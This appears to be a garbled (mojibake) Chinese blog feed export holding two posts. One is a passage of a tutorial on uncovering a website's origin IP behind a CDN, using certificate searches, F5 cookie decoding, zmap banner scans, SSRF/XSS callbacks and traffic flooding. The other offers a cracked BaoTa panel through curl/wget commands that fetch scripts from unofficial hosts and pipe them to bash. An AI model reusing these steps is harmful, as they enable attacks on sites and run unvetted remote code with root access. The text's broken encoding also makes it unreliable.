‡ç«™ç‚¹æ˜¯è¯¥httpsè¯ä¹¦çš„ç«™ç‚¹ã€‚</p><p>é€šè¿‡åè®®æŸ¥è¯¢</p><p><a href="https://censys.io/ipv4?q=((www.t00ls.net)">https://censys.io/ipv4?q=((www.t00ls.net)</a> AND protocols: â€œ443&#x2F;httpsâ€) AND tags.raw: â€œhttpsâ€&amp;</p><p>443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:moonsec.com</p><p><img src="/images/cdn%E6%89%BEip%2026e5bb7ac20b4d7cb70d737d27e2f833/Untitled%2013.png" alt="Untitled"></p><h2 id="3-7-360æµ‹ç»˜ä¸­å¿ƒ"><a href="#3-7-360æµ‹ç»˜ä¸­å¿ƒ" class="headerlink" title="3.7.Â 360æµ‹ç»˜ä¸­å¿ƒ"></a>3.7.Â <strong>360æµ‹ç»˜ä¸­å¿ƒ</strong></h2><p><a href="https://quake.360.cn/">https://quake.360.cn</a></p><p><img src="/images/cdn%E6%89%BEip%2026e5bb7ac20b4d7cb70d737d27e2f833/Untitled%2014.png" alt="Untitled"></p><h2 id="3-8-åˆ©ç”¨SSLè¯ä¹¦å¯»æ‰¾çœŸå®IP"><a href="#3-8-åˆ©ç”¨SSLè¯ä¹¦å¯»æ‰¾çœŸå®IP" class="headerlink" title="3.8.Â åˆ©ç”¨SSLè¯ä¹¦å¯»æ‰¾çœŸå®IP"></a>3.8.Â <strong>åˆ©ç”¨SSLè¯ä¹¦å¯»æ‰¾çœŸå®IP</strong></h2><p>è¯ä¹¦é¢å‘æœºæ„(CA)å¿…é¡»å°†ä»–ä»¬å‘å¸ƒçš„æ¯ä¸ªSSL&#x2F;TLSè¯ä¹¦å‘å¸ƒåˆ°å…¬å…±æ—¥å¿—ä¸­ï¼ŒSSL&#x2F;TLSè¯ä¹¦é€šå¸¸åŒ…å«åŸŸåã€å­åŸŸåå’Œç”µå­é‚®ä»¶åœ°å€ã€‚å› æ­¤SSL&#x2F;TLSè¯ä¹¦æˆä¸ºäº†æ”»å‡»è€…çš„åˆ‡å…¥ç‚¹ã€‚</p><p>è·å–ç½‘ç«™SSLè¯ä¹¦çš„HASHå†ç»“åˆCensys</p><p>åˆ©ç”¨Censysæœç´¢ç½‘ç«™çš„SSLè¯ä¹¦åŠHASHï¼Œåœ¨<a href="https://crt.shä¸ŠæŸ¥æ‰¾ç›®æ ‡ç½‘ç«™sslè¯ä¹¦çš„hash/">https://crt.shä¸ŠæŸ¥æ‰¾ç›®æ ‡ç½‘ç«™SSLè¯ä¹¦çš„HASH</a></p><p>å†ç”¨Censysæœç´¢è¯¥HASHå³å¯å¾—åˆ°çœŸå®IPåœ°å€</p><p><img src="/images/cdn%E6%89%BEip%2026e5bb7ac20b4d7cb70d737d27e2f833/Untitled%2015.png" alt="Untitled"></p><p><img src="/images/cdn%E6%89%BEip%2026e5bb7ac20b4d7cb70d737d27e2f833/Untitled%2016.png" alt="Untitled"></p><p>SSLè¯ä¹¦æœç´¢å¼•æ“ï¼š</p><p><a href="https://censys.io/ipv4?q=b6bce7fb8f7723ea63c6d0419e7af1f780d6b6cb1b4c2240e657f029142e2aae">https://censys.io/ipv4?q=b6bce7fb8f7723ea63c6d0419e7af1f780d6b6cb1b4c2240e657f029142e2aae</a></p><p><a href="https://censys.io/certificates?q=parsed.names:+t00ls.net+and+tags.raw:+trusted">https://censys.io/certificates?q=parsed.names%3A+t00ls.net+and+tags.raw%3A+trusted</a></p><p><img src="/images/cdn%E6%89%BEip%2026e5bb7ac20b4d7cb70d737d27e2f833/Untitled%2017.png" alt="Untitled"></p><p>æ‰¾åˆ°hash</p><p><img src="/images/cdn%E6%89%BEip%2026e5bb7ac20b4d7cb70d737d27e2f833/Untitled%2018.png" alt="Untitled"></p><p>è½¬æˆipv4 è¿›è¡Œæœç´¢</p><p><img src="/images/cdn%E6%89%BEip%2026e5bb7ac20b4d7cb70d737d27e2f833/Untitled%2019.png" alt="Untitled"></p><p>æ‰¾åˆ°ä¸¤ä¸ªIP</p><p>ä¸¤ä¸ªip</p><p>222.186.129.100</p><p>118.184.255.28</p><p>æˆ–è€…æŠŠhashæ”¾è¿›ç½‘ç»œç©ºé—´æœç´¢</p><p>7489210725011808154949879630532736653</p><p><img src="/images/cdn%E6%89%BEip%2026e5bb7ac20b4d7cb70d737d27e2f833/Untitled%2020.png" alt="Untitled"></p><p>æˆåŠŸæ‰¾åˆ°ç½‘ç»œIP æ¥ç€å°±æ˜¯åˆ¤æ–­ipæ˜¯å¦æ˜¯è¿™ä¸ªåŸŸåçš„äº†ã€‚</p><h2 id="3-9-é‚®ç®±è·å–çœŸå®IP"><a href="#3-9-é‚®ç®±è·å–çœŸå®IP" class="headerlink" title="3.9.Â é‚®ç®±è·å–çœŸå®IP"></a>3.9.Â <strong>é‚®ç®±è·å–çœŸå®IP</strong></h2><p>ç½‘ç«™åœ¨å‘ä¿¡çš„æ—¶å€™ï¼Œä¼šé™„å¸¦çœŸå®çš„IPåœ°å€ è¿›å…¥é‚®ç®± æŸ¥çœ‹æºæ–‡ä»¶å¤´éƒ¨ä¿¡æ¯ é€‰æ‹©from</p><p><img src="/images/cdn%E6%89%BEip%2026e5bb7ac20b4d7cb70d737d27e2f833/Untitled%2021.png" alt="Untitled"></p><p>æ˜¯å¦çœŸå® è¿˜éœ€è¦ é‚®ç®±å‘é€æ˜¯å¦ä¸ç½‘ç«™åŒä¸€ä¸ªIPåœ°å€ã€‚</p><p><img src="/images/cdn%E6%89%BEip%2026e5bb7ac20b4d7cb70d737d27e2f833/Untitled%2022.png" alt="Untitled"></p><h2 id="3-10-ç½‘ç«™æ•æ„Ÿæ–‡ä»¶è·å–çœŸå®IP"><a href="#3-10-ç½‘ç«™æ•æ„Ÿæ–‡ä»¶è·å–çœŸå®IP" class="headerlink" title="3.10.Â ç½‘ç«™æ•æ„Ÿæ–‡ä»¶è·å–çœŸå®IP"></a>3.10.Â <strong>ç½‘ç«™æ•æ„Ÿæ–‡ä»¶è·å–çœŸå®IP</strong></h2><ul><li>æ–‡ä»¶æ¢é’ˆ</li><li>phpinfo</li><li>ç½‘ç«™æºä»£ç </li><li>ä¿¡æ¯æ³„éœ²</li><li>GitHubä¿¡æ¯æ³„éœ²</li><li>jsæ–‡ä»¶</li></ul><p><img src="/images/cdn%E6%89%BEip%2026e5bb7ac20b4d7cb70d737d27e2f833/Untitled%2023.png" alt="Untitled"></p><h2 id="3-11-F5-LTMè§£ç æ³•"><a href="#3-11-F5-LTMè§£ç æ³•" class="headerlink" title="3.11.Â F5Â LTMè§£ç æ³•"></a>3.11.Â <strong>F5Â LTMè§£ç æ³•</strong></h2><p>å½“æœåŠ¡å™¨ä½¿ç”¨F5Â LTMåšè´Ÿè½½å‡è¡¡æ—¶ï¼Œé€šè¿‡å¯¹set-cookieå…³é”®å­—çš„è§£ç çœŸå®ipä¹Ÿå¯è¢«è·å–ï¼Œ</p><p>ä¾‹å¦‚ï¼šSet-Cookie:Â BIGipServerpool_8.29_8030&#x3D;487098378.24095.0000ï¼Œå…ˆæŠŠç¬¬ä¸€å°</p><p>èŠ‚çš„åè¿›åˆ¶æ•°å³487098378å–å‡ºæ¥ï¼Œç„¶åå°†å…¶è½¬ä¸ºåå…­è¿›åˆ¶æ•°1d08880aï¼Œæ¥ç€ä»åè‡³å‰ï¼Œ</p><p>ä»¥æ­¤å–å››ä½æ•°å‡ºæ¥ï¼Œä¹Ÿå°±æ˜¯0a.88.08.1dï¼Œæœ€åä¾æ¬¡æŠŠä»–ä»¬è½¬ä¸ºåè¿›åˆ¶æ•°10.136.8.29ï¼Œä¹Ÿå°±</p><p>æ˜¯æœ€åçš„çœŸå®ipã€‚</p><p>rverpool-cas01&#x3D;3255675072.20480.0000; path&#x3D;&#x2F;</p><p>3255675072 è½¬åå…­è¿›åˆ¶ c20da8c0 ä»å³å‘å·¦å– c0a80dc2 è½¬10è¿›åˆ¶ 192 168 13 194</p><h2 id="3-12-APPè·å–çœŸå®IP"><a href="#3-12-APPè·å–çœŸå®IP" class="headerlink" title="3.12.Â APPè·å–çœŸå®IP"></a>3.12.Â <strong>APPè·å–çœŸå®IP</strong></h2><p>å¦‚æœç½‘ç«™æœ‰appï¼Œä½¿ç”¨Fiddleræˆ–BurpSuiteæŠ“å–æ•°æ®åŒ… å¯èƒ½è·å–çœŸå®IP</p><p>æ¨¡æ‹Ÿå™¨ mimiæ¨¡æ‹Ÿå™¨æŠ“åŒ…</p><h2 id="3-13-å°ç¨‹åºè·å–çœŸå®IP"><a href="#3-13-å°ç¨‹åºè·å–çœŸå®IP" class="headerlink" title="3.13.Â å°ç¨‹åºè·å–çœŸå®IP"></a>3.13.Â <strong>å°ç¨‹åºè·å–çœŸå®IP</strong></h2><h2 id="3-14-é…ç½®ä¸å½“è·å–çœŸå®IP"><a href="#3-14-é…ç½®ä¸å½“è·å–çœŸå®IP" class="headerlink" title="3.14.Â é…ç½®ä¸å½“è·å–çœŸå®IP"></a>3.14.Â <strong>é…ç½®ä¸å½“è·å–çœŸå®IP</strong></h2><p>åœ¨é…ç½®CDNçš„æ—¶å€™ï¼Œéœ€è¦æŒ‡å®šåŸŸåã€ç«¯å£ç­‰ä¿¡æ¯ï¼Œæœ‰æ—¶å€™å°å°çš„é…ç½®ç»†èŠ‚å°±å®¹æ˜“å¯¼è‡´CDNé˜²æŠ¤è¢«ç»•è¿‡ã€‚</p><ul><li>æ¡ˆä¾‹1ï¼šä¸ºäº†æ–¹ä¾¿ç”¨æˆ·è®¿é—®ï¼Œæˆ‘ä»¬å¸¸å¸¸å°†test.com å’Œ test.com è§£æåˆ°åŒä¸€ä¸ªç«™ç‚¹ï¼Œè€ŒCDNåªé…ç½®äº†<a href="http://www.test.com,é€šè¿‡è®¿é—®test.com,å°±å¯ä»¥ç»•è¿‡/">www.test.comï¼Œé€šè¿‡è®¿é—®test.comï¼Œå°±å¯ä»¥ç»•è¿‡</a> CDN äº†ã€‚</li><li>æ¡ˆä¾‹2ï¼šç«™ç‚¹åŒæ—¶æ”¯æŒhttpå’Œhttpsè®¿é—®ï¼ŒCDNåªé…ç½® httpsåè®®ï¼Œé‚£ä¹ˆè¿™æ—¶è®¿é—®httpå°±å¯ä»¥è½»æ˜“ç»•è¿‡ã€‚</li></ul><h2 id="3-15-banner"><a href="#3-15-banner" class="headerlink" title="3.15.Â banner"></a>3.15.Â <strong>banner</strong></h2><p>è·å–ç›®æ ‡ç«™ç‚¹çš„bannerï¼Œåœ¨å…¨ç½‘æœç´¢å¼•æ“æœç´¢ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨AQUATONEï¼Œåœ¨Shodanä¸Šæœç´¢ç›¸åŒæŒ‡çº¹ç«™ç‚¹ã€‚</p><p>å¯ä»¥é€šè¿‡äº’è”ç½‘ç»œä¿¡æ¯ä¸­å¿ƒçš„IPæ•°æ®ï¼Œç­›é€‰ç›®æ ‡åœ°åŒºIPï¼Œéå†WebæœåŠ¡çš„bannerç”¨æ¥å¯¹æ¯”CDNç«™çš„bannerï¼Œå¯ä»¥ç¡®å®šæºIPã€‚</p><p>æ¬§æ´²ï¼š</p><p><a href="http://ftp.ripe.net/pub/stats/ripencc/delegated-ripencc-latest">http://ftp.ripe.net/pub/stats/ripencc/delegated-ripencc-latest</a></p><p>åŒ—ç¾ï¼š</p><p><a href="https://ftp.arin.net/pub/stats/arin/delegated-arin-extended-latest">https://ftp.arin.net/pub/stats/arin/delegated-arin-extended-latest</a></p><p>äºšæ´²ï¼š</p><p><a href="ftp://ftp.apnic.net/public/apnic/stats/apnic/delegated-apnic-latest">ftp://ftp.apnic.net/public/apnic/stats/apnic/delegated-apnic-latest</a></p><p>éæ´²ï¼š</p><p><a href="ftp://ftp.afrinic.net/pub/stats/afrinic/delegated-afrinic-latest">ftp://ftp.afrinic.net/pub/stats/afrinic/delegated-afrinic-latest</a></p><p>æ‹‰ç¾ï¼š</p><p><a href="ftp://ftp.lacnic.net/pub/stats/lacnic/delegated-lacnic-extended-latest">ftp://ftp.lacnic.net/pub/stats/lacnic/delegated-lacnic-extended-latest</a></p><p>è·å–CNçš„IP</p><p><a href="http://www.ipdeny.com/ipblocks/data/countries/cn.zone">http://www.ipdeny.com/ipblocks/data/countries/cn.zone</a></p><p>ä¾‹å¦‚ï¼š</p><p>æ‰¾åˆ°ç›®æ ‡æœåŠ¡å™¨ IP æ®µåï¼Œå¯ä»¥ç›´æ¥è¿›è¡Œæš´åŠ›åŒ¹é… ï¼Œä½¿ç”¨zmapã€masscan æ‰«æ HTTP bannerï¼Œç„¶ååŒ¹é…åˆ°ç›®æ ‡åŸŸåçš„ç›¸åŒ banner</p><p>zmap -p 80 -w bbs.txt -o 80.txt</p><p>ä½¿ç”¨zmapçš„banner-grabå¯¹æ‰«æå‡ºæ¥80ç«¯å£å¼€æ”¾çš„ä¸»æœºè¿›è¡ŒbanneræŠ“å–ã€‚</p><p>cat &#x2F;root&#x2F;bbs.txt |.&#x2F;banner-grab-tcp -p 80 -c 100 -d http-req -f ascii &gt; http-banners.out</p><p>æ ¹æ®ç½‘ç«™è¿”å›åŒ…ç‰¹å¾ï¼Œè¿›è¡Œç‰¹å¾è¿‡æ»¤</p><p>location: plugin.php?id&#x3D;info:index</p><p><a href="https://fofa.so/">https://fofa.so/</a></p><p>title&#x3D;â€T00LS | ä½è°ƒæ±‚å‘å±• - æ½œå¿ƒä¹ å®‰å…¨ - T00ls.Netâ€</p><p><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p><p>title:â€T00LS | ä½è°ƒæ±‚å‘å±• -æ½œå¿ƒä¹ å®‰å…¨ -T00ls.Netâ€</p><p><a href="https://quake.360.cn/">https://quake.360.cn/</a></p><p>response:â€T00LS | ä½è°ƒæ±‚å‘å±• - æ½œå¿ƒä¹ å®‰å…¨ - T00ls.Netâ€</p><p>1ã€ZMapå·ç§°æ˜¯æœ€å¿«çš„äº’è”ç½‘æ‰«æå·¥å…·ï¼Œèƒ½å¤Ÿåœ¨45åˆ†é’Ÿæ‰«éå…¨ç½‘ã€‚<a href="https://github.com/zmap/zmap">https://github.com/zmap/zmap</a></p><p>2ã€Masscanå·ç§°æ˜¯æœ€å¿«çš„äº’è”ç½‘ç«¯å£æ‰«æå™¨ï¼Œæœ€å¿«å¯ä»¥åœ¨å…­åˆ†é’Ÿå†…æ‰«éäº’è”ç½‘ã€‚</p><p><a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p><h2 id="3-16-é•¿æœŸå…³æ³¨"><a href="#3-16-é•¿æœŸå…³æ³¨" class="headerlink" title="3.16.Â é•¿æœŸå…³æ³¨"></a>3.16.Â <strong>é•¿æœŸå…³æ³¨</strong></h2><p>åœ¨é•¿æœŸæ¸—é€çš„æ—¶å€™ï¼Œè®¾ç½®ç¨‹åºæ¯å¤©è®¿é—®ç½‘ç«™ï¼Œå¯èƒ½æœ‰æ–°çš„å‘ç°ã€‚æ¯å¤©é›¶ç‚¹ æˆ–è€…ä¸šåŠ¡éœ€æ±‚å¢å¤§ å®ƒä¼šæ¢ip æ¢æœåŠ¡å™¨çš„ã€‚</p><h2 id="3-17-æµé‡æ”»å‡»"><a href="#3-17-æµé‡æ”»å‡»" class="headerlink" title="3.17.Â æµé‡æ”»å‡»"></a>3.17.Â <strong>æµé‡æ”»å‡»</strong></h2><p>å‘åŒ…æœºå¯ä»¥ä¸€ä¸‹å­å‘é€å¾ˆå¤§çš„æµé‡ã€‚</p><p>è¿™ä¸ªæ–¹æ³•æ˜¯å¾ˆç¬¨ï¼Œä½†æ˜¯åœ¨ç‰¹å®šçš„ç›®æ ‡ä¸‹æ¸—é€ï¼Œå»ºè®®é‡‡ç”¨ã€‚</p><p>cdné™¤äº†èƒ½éšè—ipï¼Œå¯èƒ½è¿˜è€ƒè™‘åˆ°åˆ†é…æµé‡ï¼Œ</p><p>ä¸è®¾é˜²çš„cdn é‡å¤§å°±ä¼šæŒ‚ï¼Œé«˜é˜²cdn è¦å¤§æµé‡è®¿é—®ã€‚</p><p>ç»å—ä¸ä½å¤§æµé‡å†²å‡»çš„æ—¶å€™å¯èƒ½ä¼šæ˜¾ç¤ºçœŸå®ipã€‚</p><p>ç«™é•¿-&gt;ä¸šåŠ¡ä¸æ­£å¸¸-&gt;cdnä¸ä½¿ç”¨-&gt;æ›´æ¢æœåŠ¡å™¨ã€‚</p><h2 id="3-18-è¢«åŠ¨è·å–"><a href="#3-18-è¢«åŠ¨è·å–" class="headerlink" title="3.18.Â è¢«åŠ¨è·å–"></a>3.18.Â <strong>è¢«åŠ¨è·å–</strong></h2><p>è¢«åŠ¨è·å–å°±æ˜¯è®©æœåŠ¡å™¨æˆ–ç½‘ç«™ä¸»åŠ¨è¿æ¥æˆ‘ä»¬çš„æœåŠ¡å™¨ï¼Œä»è€Œè·å–æœåŠ¡å™¨çš„çœŸå®IP</p><p>å¦‚æœç½‘ç«™æœ‰ç¼–è¾‘å™¨å¯ä»¥å¡«å†™è¿œç¨‹urlå›¾ç‰‡ï¼Œå³å¯è·å–çœŸå®IP</p><p>å¦‚æœå­˜åœ¨ssrfæ¼æ´ æˆ–è€…xss è®©æœåŠ¡å™¨ä¸»åŠ¨è¿æ¥æˆ‘ä»¬çš„æœåŠ¡å™¨ å‡å¯è·å–çœŸå®IPã€‚</p><h2 id="3-19-æ‰«å…¨ç½‘è·å–çœŸå®IP"><a href="#3-19-æ‰«å…¨ç½‘è·å–çœŸå®IP" class="headerlink" title="3.19.Â æ‰«å…¨ç½‘è·å–çœŸå®IP"></a>3.19.Â <strong>æ‰«å…¨ç½‘è·å–çœŸå®IP</strong></h2><p><a href="https://github.com/superfish9/hackcdn">https://github.com/superfish9/hackcdn</a></p><p><a href="https://github.com/boy-hack/w8fuckcdn">https://github.com/boy-hack/w8fuckcdn</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="ç½‘ç»œå®‰å…¨" scheme="http://blog.ioimp.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="ç½‘å®‰" scheme="http://blog.ioimp.top/tags/%E7%BD%91%E5%AE%89/"/>
    
    <category term="æ¸—é€å¿…çŸ¥å¿…ä¼š" scheme="http://blog.ioimp.top/tags/%E6%B8%97%E9%80%8F%E5%BF%85%E7%9F%A5%E5%BF%85%E4%BC%9A/"/>
    
  </entry>
  
  <entry>
    <title>å®å¡”é¢æ¿ä¼ä¸šç‰ˆ</title>
    <link href="http://blog.ioimp.top/2023/08/07/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E4%BC%81%E4%B8%9A%E7%89%88/"/>
    <id>http://blog.ioimp.top/2023/08/07/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E4%BC%81%E4%B8%9A%E7%89%88/</id>
    <published>2023-08-07T05:44:37.000Z</published>
    <updated>2023-08-07T05:49:16.217Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ä»å¤–éƒ¨å¼•å…¥è„šæœ¬</p><p>æµ‹è¯•å¯ç”¨</p><p>è‡ªè¡Œè¾¨åˆ«å®‰å…¨</p><p>å®‰è£…è„šæœ¬å’Œå‡çº§è„šæœ¬è‡ªå·±çœ‹å®é™…æƒ…å†µä½¿ç”¨</p><p>å®å¡”ä¼ä¸šç‰ˆä»‹ç»</p><p>Â· å®‰å…¨ï¼šå‰¥ç¦»äº†æ‰€æœ‰ä¸å®å¡”å®˜æ–¹çš„é€šä¿¡ã€ä¸ŠæŠ¥ã€ä¸‹å‘ï¼›å¹¶ä¸”ä¸ä¸æœ¬ç«™ä¼ä¸šç‰ˆæœåŠ¡å™¨é€šä¿¡ï¼›</p><p>Â· å…è´¹ï¼šæå‡ä¸ºä¼ä¸šä¼šå‘˜ï¼Œå…è´¹ä½¿ç”¨è½¯ä»¶å•†åº—ä¸­çš„æ‰€æœ‰[ä¼ä¸šç‰ˆæ’ä»¶]ã€[ä¸“ä¸šç‰ˆæ’ä»¶]ã€[è¿è¡Œç¯å¢ƒ]ã€[å…è´¹æ’ä»¶]ã€[å®å¡”æ’ä»¶]ï¼›éƒ¨åˆ†[ç¬¬ä¸‰æ–¹åº”ç”¨]å®‰è£…å¯èƒ½ä¼šå¤±è´¥ï¼›</p><p>Â· è§£å†³æ–¹æ¡ˆï¼šæ‰€æœ‰åŠŸèƒ½ä¸åŸç‰ˆä¸€è‡´ï¼Œå¦‚æœ‰ä»»ä½•é—®é¢˜è¯·å‚è€ƒå®å¡”å®˜æ–¹è§£å†³æ–¹æ¡ˆï¼›æˆ–å‰å¾€äº¤æµç¾¤äº¤æµï¼</p><p>Â· é¢æ¿ä¿®å¤ï¼šä¼ä¸šç‰ˆä¸ä¸å®˜æ–¹é€šä¿¡ï¼Œä¹Ÿæ²¡æœ‰ä¸æˆ‘ä»¬æœåŠ¡å™¨é€šä¿¡ï¼Œæ‰€ä»¥æ— æ³•åˆ¤æ–­è´µç«™æƒ…å†µï¼Œå»ºè®®ä½¿ç”¨å‡çº§ä»£ç ä¿®å¤&#x2F;æˆ–å®‰è£…å®å¡”å®˜æ–¹ç‰ˆå†å®‰è£…ä¼ä¸šç‰ˆ(å°æ¦‚ç‡å‡ºç°å¼‚å¸¸ï¼Œå¤§æ¦‚ç‡åªé‡è£…é¢æ¿ä¸å½±å“ç½‘ç«™è¿è¡Œ)ï¼›</p><p>Â· å…¶ä»–æç¤ºï¼šå¦‚æœå‘ç°[è½¯ä»¶å•†åº—]ç©ºç™½ï¼Œå¤§å¤šæ˜¯æœåŠ¡å™¨ä¸ä½ æœ¬åœ°çš„ç½‘ç»œé—®é¢˜ï¼Œè¯·æ¸…ç†æœ¬åœ°ç¼“å­˜&#x2F;åˆ‡æ¢æµè§ˆå™¨çš„è®¿å®¢æ¨¡å¼è®¿é—®&#x2F;åˆ‡æ¢æœ¬åœ°ä»£ç†IPï¼›</p><p>Â· æœ¬ç«™å£°æ˜ï¼šä¼ä¸šç‰ˆåŸºäºå®˜æ–¹ä»£ç ã€ä»…åšé€šä¿¡å‰¥ç¦»ã€ä»£ç æœªåŠ å¯†ã€æœªæ·»åŠ ä»»ä½•æ–°å¢ä»£ç ï¼</p><h2 id="å®å¡”ä¼ä¸šç‰ˆé¢æ¿ï¼š"><a href="#å®å¡”ä¼ä¸šç‰ˆé¢æ¿ï¼š" class="headerlink" title="å®å¡”ä¼ä¸šç‰ˆé¢æ¿ï¼š"></a>å®å¡”ä¼ä¸šç‰ˆé¢æ¿ï¼š</h2><p>æ–°ç¯å¢ƒæ–°æœåŠ¡å™¨ï¼ˆä¹Ÿæ˜¯å°±ä»€ä¹ˆéƒ½æ²¡è£…çš„ä½¿ç”¨ä¸‹é¢å‘½ä»¤å®‰è£…ï¼‰å·²å®‰è£…æœ‹å‹è¯·ç›´æ¥è·³è¿‡å¾€ä¸‹çœ‹ï¼</p><p>å®˜æ–¹æœ€æ–°ç‰ˆ7.9ç‰ˆæœ¬ï¼Œå®‰è£…è„šæœ¬ï¼ˆæ¥æºå®å¡”å®˜æ–¹ï¼‰ï¼š</p><p>æ•™ç¨‹ç¯å¢ƒä½¿ç”¨çš„æ˜¯CentOS 7.9</p><h2 id="å®‰è£…å‘½ä»¤ï¼š"><a href="#å®‰è£…å‘½ä»¤ï¼š" class="headerlink" title="å®‰è£…å‘½ä»¤ï¼š"></a>å®‰è£…å‘½ä»¤ï¼š</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Centoså®‰è£…å‘½ä»¤ï¼ˆé»˜è®¤å®‰è£…æ˜¯7.8.0 ç›´æ¥åœ¨çº¿å‡çº§7.9.3ï¼‰ï¼š</span><br><span class="line"></span><br><span class="line">ä¸»èŠ‚ç‚¹ï¼šyum install -y wget &amp;&amp; wget -O install.sh http://io.bt.sy/install/install_6.0.sh &amp;&amp; sh install.sh </span><br><span class="line"></span><br><span class="line">æµ·å¤–èŠ‚ç‚¹ä¸“ç”¨ï¼šyum install -y wget &amp;&amp; wget -O install.sh http://io.yu.al/install/install_6.0.sh &amp;&amp; sh install.sh </span><br><span class="line"></span><br><span class="line">è¯•éªŒæ€§Centos/Ubuntu/Debianå®‰è£…å‘½ä»¤ ç‹¬ç«‹è¿è¡Œç¯å¢ƒï¼ˆpy3.7ï¼‰ å¯èƒ½å­˜åœ¨å°‘é‡å…¼å®¹æ€§é—®é¢˜ ä¸æ–­ä¼˜åŒ–ä¸­</span><br><span class="line"></span><br><span class="line">ä¸»èŠ‚ç‚¹ï¼šcurl -sSO http://io.bt.sy/install/install_panel.sh &amp;&amp; bash install_panel.sh </span><br><span class="line"></span><br><span class="line">æµ·å¤–èŠ‚ç‚¹ä¸“ç”¨ï¼šcurl -sSO http://io.yu.al/install/install_panel.sh &amp;&amp; bash install_panel.sh </span><br><span class="line"></span><br><span class="line">Ubuntu Deepinå®‰è£…å‘½ä»¤ï¼š</span><br><span class="line"></span><br><span class="line">ä¸»èŠ‚ç‚¹ï¼šwget -O install.sh http://io.bt.sy/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash install.sh </span><br><span class="line"></span><br><span class="line">æµ·å¤–èŠ‚ç‚¹ä¸“ç”¨ï¼šwget -O install.sh http://io.yu.al/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash install.sh </span><br><span class="line"></span><br><span class="line">Debianå®‰è£…å‘½ä»¤ï¼š</span><br><span class="line"></span><br><span class="line">ä¸»èŠ‚ç‚¹ï¼šwget -O install.sh http://io.bt.sy/install/install-ubuntu_6.0.sh &amp;&amp; bash install.sh </span><br><span class="line"></span><br><span class="line">æµ·å¤–èŠ‚ç‚¹ä¸“ç”¨ï¼šwget -O install.sh http://io.yu.al/install/install-ubuntu_6.0.sh &amp;&amp; bash install.sh </span><br><span class="line"></span><br><span class="line">Fedoraå®‰è£…å‘½ä»¤:</span><br><span class="line"></span><br><span class="line">ä¸»èŠ‚ç‚¹ï¼šwget -O install.sh http://io.bt.sy/install/install_6.0.sh &amp;&amp; bash install.sh </span><br><span class="line"></span><br><span class="line">æµ·å¤–èŠ‚ç‚¹ä¸“ç”¨ï¼šwget -O install.sh http://io.yu.al/install/install_6.0.sh &amp;&amp; bash install.sh[/van-wechat-hide]</span><br></pre></td></tr></table></figure><h2 id="å‡çº§æ•™ç¨‹ï¼š"><a href="#å‡çº§æ•™ç¨‹ï¼š" class="headerlink" title="å‡çº§æ•™ç¨‹ï¼š"></a>å‡çº§æ•™ç¨‹ï¼š</h2><p>1.é¦–å…ˆå‡çº§åˆ°å®˜æ–¹æœ€æ–°ç‰ˆ7.9ç‰ˆæœ¬ï¼Œå‡çº§è„šæœ¬ï¼ˆæ¥æºå®å¡”å®˜æ–¹ï¼‰ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://download.bt.cn/install/update_panel.sh|bash</span><br></pre></td></tr></table></figure><p>å‡çº§å‘½ä»¤1</p><p>Linuxé¢æ¿ 7.9.3 å‡çº§ä¼ä¸šç‰ˆå‘½ä»¤ 1ï¼ˆ7.9.3 å®˜æ–¹ç‰ˆ &#x2F; 7.7.0 å¼€å¿ƒç‰ˆ å¯ä»¥æ‰§è¡Œè¿™ä¸ªå‡çº§åˆ° 7.9.3 å¼€å¿ƒç‰ˆï¼‰ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ä¸»èŠ‚ç‚¹ï¼šcurl https://io.bt.sy/install/update_panel.sh|bash</span><br><span class="line"></span><br><span class="line">æµ·å¤–èŠ‚ç‚¹ä¸“ç”¨ï¼šcurl https://io.yu.al/install/update_panel.sh|bash</span><br><span class="line"></span><br><span class="line">å‡çº§å‘½ä»¤2</span><br><span class="line"></span><br><span class="line">Linuxé¢æ¿ 7.9.3 å‡çº§ä¼ä¸šç‰ˆå‘½ä»¤ 2ï¼ˆ7.9.3 å®˜æ–¹ç‰ˆ / 7.7.0 å¼€å¿ƒç‰ˆ å¯ä»¥æ‰§è¡Œè¿™ä¸ªå‡çº§åˆ° 7.9.3 å¼€å¿ƒç‰ˆï¼‰ï¼š</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span 